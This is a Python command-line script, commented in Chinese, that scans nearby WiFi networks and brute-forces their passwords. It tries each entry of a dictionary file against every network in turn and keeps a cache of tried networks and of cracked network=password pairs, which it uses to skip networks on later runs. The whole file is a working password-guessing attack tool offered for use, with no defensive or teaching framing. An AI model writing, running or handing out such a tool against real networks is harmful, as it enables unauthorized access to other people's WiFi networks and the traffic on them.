from sword_pywifi.MyWifi import MyWifi
import argparse
import os

def parser_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=int, help='网卡接口')
    parser.add_argument('-d', '--dictionary', type=str, help='字典')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-k', '--knwon', action='store_true', help='过滤已破解AP')
    group.add_argument('-c', '--cache', action='store_true', help='过滤全部已缓存AP，包括知道密码的和不知道密码但尝试过的')
    args = parser.parse_args()
    return args

def main(args=None):
    args = parser_args()
    if args.interface is None:
        myWifi = MyWifi()
    else:
        myWifi = MyWifi(args.interface)

    if args.dictionary is None:
        dictionary_path = os.path.abspath(os.path.join(__file__, '..', 'dictionary', 'default.txt'))
    else:
        dictionary_path = args.dictionary

    wifiList_path = os.path.abspath(os.path.join(__file__, '..', 'cache', 'wifiList.txt'))
    filter_path = os.path.abspath(os.path.join(__file__, '..', 'cache', 'filter.txt'))

    myWifi.wifiScan(wifiList_path)

    wifi_names = [] # wifiList
    caches = [] # 全部缓存，包括知道密码的和不知道密码但尝试过的
    knowns = [] # 已破解的
    results = [] # 结果

    # 读取 wifiList.txt 中的 wifi
    with open(wifiList_path, "r", encoding='utf-8') as wifiList:
        for line in wifiList:
            ssid = line[:-1] if line[-1] == '\n' else line
            wifi_names.append(ssid)
    
    # 读取 filter.txt 中的 wifi
    with open(filter_path, "r", encoding='utf-8') as filterList:
        for line in filterList:
            composition = line[:-1] if line[-1] == '\n' else line
            # slipt
            strs = composition.split('=')
            ssid = strs[0]
            caches.append(ssid)
            if len(strs) > 1:
                knowns.append(ssid)

    # 集合运算
    if args.knwon is True:
        results = list( set(wifi_names)- set(knowns) )
    elif args.cache is True: 
        results = list( set(wifi_names)- set(caches) )
    else:
        results = wifi_names
    print(f'目标网络：\n\t{results}')
    newLines = []
    # 测试每个WiFi
    try:        
        # 打开文件
        passwds = []
        with open(dictionary_path, "r", encoding='utf-8') as file:
            for line in file:
                passwd = line[:-1] if line[-1] == '\n' else line
                passwds.append(passwd)
        
        for ssid in results:
            print(f"开始破解: {ssid}")
            for passwd in passwds:        
                # 破解成功
                if myWifi.wifiConnect(ssid, passwd):
                    print(f'[{passwd}]-[{ssid}]')
                    print("!!!!!!!!!!!!!!!!!WiFi已自动连接!!!!!!!!!!!!!!!!!")
                    newLine = f'{ssid}={passwd}'
                    newLines.append(newLine)
                    raise Exception('congratulation')
                else:
                    print(f'[{passwd}]-[{ssid}]')
            # 密码失败，记录ssid
            newLine = f'{ssid}'
            newLines.append(newLine)
    except: # Ctrl-C中止程序
        print("中止程序")
    finally:
        with open(filter_path, "a", encoding='utf-8') as fp:
            for newLine in newLines:
                if newLine.split('=')[0] not in caches:
                    fp.write(f'{newLine}\n')


if __name__ == '__main__':
    main()